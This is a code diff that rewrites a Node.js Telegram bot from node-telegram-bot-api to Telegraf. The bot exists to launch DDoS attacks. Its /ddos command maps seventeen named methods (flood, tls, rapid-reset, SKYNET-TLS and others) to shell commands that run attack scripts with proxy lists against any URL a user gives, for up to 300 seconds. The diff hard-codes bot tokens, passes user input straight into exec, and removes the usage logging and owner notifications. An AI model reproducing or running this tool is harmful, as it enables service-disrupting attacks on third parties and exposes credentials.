@@ -1,193 +1,113 @@
-const TelegramBot = require('node-telegram-bot-api');
+const { Telegraf } = require('telegraf');
 const exec = require('child_process').exec;
 const util = require('util');
 
-const bot = new TelegramBot('7618071329:AAGUW39cj_qzihRP3XOwRqWw0cZ_X7upY8o', { polling: true });
+const bot = new Telegraf('7062528333:AAHj5kg-cH7h_YuN0cnTpzzaicqzaTsvTcE');
 const ownerChatId = '6434916607';
-
-const commandUsageList = [];
 const validMethods = new Set([
-  'kill', 'strike', 'flood', 'tls2', 'bypass', 'tls', 'ninja', 'mix', 'raw', 
+  'kill', 'strike', 'flood', 'tls2', 'bypass', 'tls', 'ninja', 'mix', 'raw',
   'rapid-reset', 'pidoras', 'http-x', 'ssh', 'SKYNET-TLS', 'SEN-TLS', 'star-tls', 'ELSTARO-TLS'
 ]);
 
-bot.onText(/\/start/, (msg) => {
-  bot.sendMessage(msg.chat.id, `💀 WARNING: You've entered a dangerous zone, hacker. 💀
+const execPromise = util.promisify(exec);
+
+bot.start((ctx) => {
+  ctx.reply(`💀 WARNING: Welcome, hacker. 💀
 
 This is your command interface for executing **DDoS attacks**.
 
 ⚡ Usage: /ddos <method> <url> <time>
 
-🚨 LIST OF METHODS AVAILABLE FOR YOU TO EXECUTE: 🚨
-- kill
-- strike
-- flood
-- tls2
-- bypass
-- tls
-- ninja
-- mix
-- raw
-- rapid-reset
-- pidoras
-- http-x
-- ssh
-- SKYNET-TLS
-- SEN-TLS
-- star-tls
-- ELSTARO-TLS
+🚨 LIST OF METHODS: 🚨
+${[...validMethods].join('\n')}
 
-⚠️ **Warning**: Only use these methods if you are fully aware of the consequences. Unauthorized use will be tracked. ⚠️`);
+⚠️ **Warning**: Use these responsibly.`);
 });
 
-bot.onText(/\/ddos (.+) (.+) (.+)/, async (msg, match) => {
-  const methods = match[1];
-  const url = match[2];
-  let time = Math.min(parseInt(match[3]), 300);
-
-  if (!validMethods.has(methods)) {
-    bot.sendMessage(msg.chat.id, '💀 ERROR: Invalid method detected! 💀\n\nOnly authorized methods can be executed. Retry with a valid method.');
-    return;
+bot.command('ddos', async (ctx) => {
+  const args = ctx.message.text.split(' ').slice(1);
+  if (args.length < 3) {
+    return ctx.reply('💀 ERROR: Invalid format!\nUsage: /ddos <method> <url> <time>');
   }
 
-  if (time <= 0 || time > 300) {
-    bot.sendMessage(msg.chat.id, '⚡ ERROR: Attack time is invalid! ⚡\n\nMax time is 300 seconds. Adjust the attack duration and try again.');
-    return;
+  const [method, url, time] = args;
+  const attackTime = Math.min(parseInt(time), 300);
+
+  if (!validMethods.has(method)) {
+    return ctx.reply('💀 ERROR: Invalid method detected!');
+  }
+
+  if (attackTime <= 0 || attackTime > 300) {
+    return ctx.reply('⚡ ERROR: Invalid time! Max time is 300 seconds.');
   }
 
   let command = '';
-  switch (methods) {
+  switch (method) {
     case 'kill':
-      command = `node StarsXKill.js ${url} ${time} 100 10`;
+      command = `node StarsXKill.js ${url} ${attackTime} 100 10`;
       break;
     case 'strike':
-      command = `node StarsXStrike.js GET ${url} ${time} 10 90 proxy.txt --full`;
+      command = `node StarsXStrike.js GET ${url} ${attackTime} 10 90 proxy.txt --full`;
       break;
     case 'flood':
-      command = `node flood.js ${url} ${time} 200 2 proxy.txt`;
+      command = `node flood.js ${url} ${attackTime} 200 2 proxy.txt`;
       break;
     case 'tls2':
-      command = `node tls.js ${url} ${time} 200 2 proxy.txt`;
+      command = `node tls.js ${url} ${attackTime} 200 2 proxy.txt`;
       break;
     case 'bypass':
-      command = `node StarsXBypass.js ${url} ${time} 100 10 proxy.txt`;
+      command = `node StarsXBypass.js ${url} ${attackTime} 100 10 proxy.txt`;
       break;
     case 'tls':
-      command = `node StarsXTls.js ${url} ${time} 100 10`;
+      command = `node StarsXTls.js ${url} ${attackTime} 100 10`;
       break;
     case 'ninja':
-      command = `node StarsXNinja.js ${url} ${time}`;
+      command = `node StarsXNinja.js ${url} ${attackTime}`;
       break;
     case 'mix':
-      command = `node StarsXMix.js ${url} ${time} 100 10 proxy.txt`;
+      command = `node StarsXMix.js ${url} ${attackTime} 100 10 proxy.txt`;
       break;
     case 'raw':
-      command = `node StarsXRaw.js ${url} ${time}`;
+      command = `node StarsXRaw.js ${url} ${attackTime}`;
       break;
     case 'rapid-reset':
-      command = `node StarsXRapid-Reset.js PermenMD ${time} 10 proxy.txt 80 ${url}`;
+      command = `node StarsXRapid-Reset.js PermenMD ${attackTime} 10 proxy.txt 80 ${url}`;
       break;
     case 'pidoras':
-      command = `node StarsXPidoras.js ${url} ${time} 80 10 proxy.txt`;
+      command = `node StarsXPidoras.js ${url} ${attackTime} 80 10 proxy.txt`;
       break;
     case 'http-x':
-      command = `node HTTP-X.js ${url} ${time} 80 10 proxy.txt`;
+      command = `node HTTP-X.js ${url} ${attackTime} 80 10 proxy.txt`;
       break;
     case 'ssh':
-      command = `node StarsXSsh.js ${url} 22 root ${time}`;
+      command = `node StarsXSsh.js ${url} 22 root ${attackTime}`;
       break;
     case 'SKYNET-TLS':
-      command = `node SKYNET-TLS.js ${url} ${time} 200 10 proxy.txt`;
+      command = `node SKYNET-TLS.js ${url} ${attackTime} 200 10 proxy.txt`;
       break;
     case 'SEN-TLS':
-      command = `node SEN-TLS.js ${url} ${time} 200 10 proxy.txt`;
+      command = `node SEN-TLS.js ${url} ${attackTime} 200 10 proxy.txt`;
       break;
     case 'star-tls':
-      command = `node star-tls.js ${url} ${time} 200 10 proxy.txt`;
+      command = `node star-tls.js ${url} ${attackTime} 200 10 proxy.txt`;
       break;
     case 'ELSTARO-TLS':
-      command = `node ELSTARO-TLS.js ${url} ${time} 200 10 proxy.txt`;
+      command = `node ELSTARO-TLS.js ${url} ${attackTime} 200 10 proxy.txt`;
       break;
+    default:
+      return ctx.reply('💀 ERROR: Unknown method.');
   }
-
-  // Log to command usage
-  commandUsageList.push({
-    user: msg.from.username,
-    methods,
-    url,
-    time,
-    timestamp: new Date().toISOString(),
-  });
-
-  // Notify owner
-  const ownerNotification = `🚨 WARNING: User ${msg.from.username} has initiated a command:\nMethods: ${methods}\nURL: ${url}\nTime: ${time}`;
-  bot.sendMessage(ownerChatId, ownerNotification);
-
-  bot.sendMessage(msg.chat.id, `⚡ ATTACK IN PROGRESS ⚡\nMethods: ${methods}\nURL: ${url}\nTime: ${time}`);
 
   try {
+    await ctx.reply(`⚡ ATTACK IN PROGRESS ⚡\nMethod: ${method}\nURL: ${url}\nTime: ${attackTime}`);
     const { stdout, stderr } = await execPromise(command);
-
     if (stderr) {
-      bot.sendMessage(msg.chat.id, `🔥 ERROR: Something went wrong! 🔥\nDetails: ${stderr}`);
-      return;
+      return ctx.reply(`🔥 ERROR: ${stderr}`);
     }
-
-    const responseMessage = `💥 ATTACK COMPLETED 💥\nMethods: ${methods}\nURL: ${url}\nTime: ${time}\nResult: ${stdout}`;
-    bot.sendMessage(msg.chat.id, responseMessage);
+    ctx.reply(`💥 ATTACK COMPLETED 💥\nResult: ${stdout}`);
   } catch (error) {
-    bot.sendMessage(msg.chat.id, `💀 CRITICAL ERROR 💀\nDetails: ${error.message}`);
+    ctx.reply(`💀 CRITICAL ERROR 💀\nDetails: ${error.message}`);
   }
 });
 
-bot.onText(/\/list/, (msg) => {
-  if (msg.from.id.toString() !== ownerChatId) {
-    bot.sendMessage(msg.chat.id, '💀 ERROR: You do not have permission to access this feature. 💀');
-    return;
-  }
-
-  let listMessage = '🚨 COMMAND USAGE LOG 🚨\n';
-  commandUsageList.forEach((usage) => {
-    const currentTime = new Date().getTime();
-    const endTime = new Date(usage.timestamp).getTime() + (usage.time * 1000);
-    if (endTime > currentTime) {
-      listMessage += `\nUser: ${usage.user}\nMethods: ${usage.methods}\nURL: ${usage.url}\nTime: ${usage.time}\nTimestamp: ${usage.timestamp}\n`;
-    }
-  });
-  bot.sendMessage(msg.chat.id, listMessage || '💀 No active commands found. 💀');
-});
-
-let runningProcess = null;
-
-bot.onText(/\/stop/, (msg) => {
-  if (msg.from.id.toString() !== ownerChatId) {
-    bot.sendMessage(msg.chat.id, '💀 ERROR: You do not have permission to stop attacks. 💀');
-    return;
-  }
-
-  if (runningProcess) {
-    runningProcess.kill();
-    bot.sendMessage(msg.chat.id, '⚠️ DDoS process has been terminated. ⚠️');
-    runningProcess = null;
-  } else {
-    bot.sendMessage(msg.chat.id, '⚠️ No DDoS process is currently running. ⚠️');
-  }
-});
-
-function createButton(text, url) {
-  return { text, url };
-}
-
-bot.onText(/\/http (.+)/, (msg, match) => {
-  const web = match[1];
-  const url = `https://check-host.net/check-http?host=${web}&csrf_token=`;
-  const button = createButton('Click here to check', url);
-  bot.sendMessage(msg.chat.id, '⚡ Click the link below to check the status:', {
-    reply_markup: {
-      inline_keyboard: [[button]]
-    }
-  });
-});
-
-// Promisify exec for async/await usage
-const execPromise = util.promisify(exec);
+bot.launch();
